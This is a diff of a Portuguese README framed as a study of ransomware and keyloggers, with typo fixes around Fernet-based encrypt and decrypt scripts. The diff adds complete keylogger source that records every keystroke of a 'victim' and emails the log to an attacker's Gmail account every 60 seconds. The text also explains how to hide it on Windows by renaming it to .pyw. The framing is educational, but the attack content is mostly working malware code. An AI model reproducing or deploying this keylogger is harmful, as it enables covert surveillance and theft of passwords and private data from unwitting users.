@@ -1,4 +1,4 @@
-# estudo_ransomware_e_keylogger
+# ESTUDO RANSOMWARE E KEYLOGGER
 Aprendizagem sobre o funcionamento de um ransomware e keyloggers
 
 
@@ -8,7 +8,7 @@ Realizei toda a prática ensinada / orientada para que eu pudesse sentir diretam
 Utilizei os mesmos scripts no VSCode para as duas técnicas.
 
 
-## Malware - Ransomware: Criptograr ##
+## Malware - Ransomware: Criptografar ##
 
 > Script para que os dados de alguns arquivos sejam criptografados através de uma chave e somente após o pagamento de resgate, a chave é informada para descriptografar esses dados.
 >
@@ -18,7 +18,7 @@ from cryptography.fernet import Fernet
 import os
 
 
-> #1. Gerar uma chave de criptpgrafia e salvar
+> #1. Gerar uma chave de criptografia e salvar
 
 def gerar_chave():
     chave = Fernet.generate_key()
@@ -77,7 +77,7 @@ if __name__ == "__main__":
 
     -----------------------------------------
     
-## Malware - Ransomware: Descriptograr ##
+## Malware - Ransomware: Descriptografar ##
 
 from cryptography.fernet import Fernet
 import os  
@@ -116,7 +116,7 @@ if __name__ == "__main__":
 
 ## Malware - Keylogger: ##
 
-> KEYLOGGER > Registra tudo o que é digitado na máquina da vítima.
+*KEYLOGGER > Registra tudo o que é digitado na máquina da vítima.
 
 Instalar a lib (biblioteca) no VSCode:
 
@@ -127,7 +127,7 @@ Instalar a lib (biblioteca) no VSCode:
 3- O que for digitado será gravado em um arquivo .txt; 
 4- O arquivo vai mostrar tudo o que foi digitado e de forma sequencial.
 
-***No WINDOWS, para ficar invisível, apenas precisamos renomear o arquivo com a extensão .pyw (Exemplo: keylogger.pyw)
+*No WINDOWS, para ficar invisível, apenas precisamos renomear o arquivo com a extensão .pyw (Exemplo: keylogger.pyw)
 
 > * CÓDIGO: * <
 
@@ -172,12 +172,69 @@ with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 
 
-
-# NO WINDOWS, PARA FICAR INVISÍVEL, RENOMEAMOS O NOME DO ARQUIVO COM A EXTENSÃO .PYW
-# EXEMPLO: keylogger.pyw 
+NO WINDOWS, PARA FICAR INVISÍVEL, RENOMEAMOS O NOME DO ARQUIVO COM A EXTENSÃO .PYW
+EXEMPLO: keylogger.pyw 
 
 Dessa forma, fica em modo FURTIVO sem a necessidade de Terminal aberto.
     
     ==========================================
 
+    
+*KEYLOGGER E-MAIL > Registra tudo o que é digitado na máquina da vítima e envia automaticamente para o email informado do atacante.
 
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+log = ""    
+
+#CONFIGURAÇÕES DO EMAIL
+
+EMAIL_ORIGEM = "xxx@gmail.com"
+EMAIL_DESTINO = "xxx@gmail.com"  
+SENHA_EMAIL = "xxxx xxxx xxxx xxxx"  #Senha de app do Gmail
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['FROM'] = EMAIL_ORIGEM
+        msg['TO'] = EMAIL_DESTINO
+        
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+        server.send_message(msg)
+        server.quit()
+        
+    except Exception as e:
+        print("Erro ao enviar email", e)  
+    log = ""
+    
+    #AGENDAR UM NOVO ENVIO DE EMAIL A CADA 60 SEGUNDOS 
+    Timer(60, enviar_email).start()
+    
+def on_press(key):
+    global log
+    try:
+            log += key.char
+            
+    except AttributeError:
+        if key == keyboard.Key.space:
+                log += " "
+        elif key == keyboard.Key.enter:
+                log += "\n"
+        elif key == keyboard.Key.tab:
+                log += "\t"
+        elif key == keyboard.Key.backspace:
+                log += "[<]"   
+        else:
+            pass #Ignorar control, shift, alt, etc.
+            
+#INICIA O KEYLOGGER E O ENVIO DE AUTOMÁTICO DE EMAILS
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join()
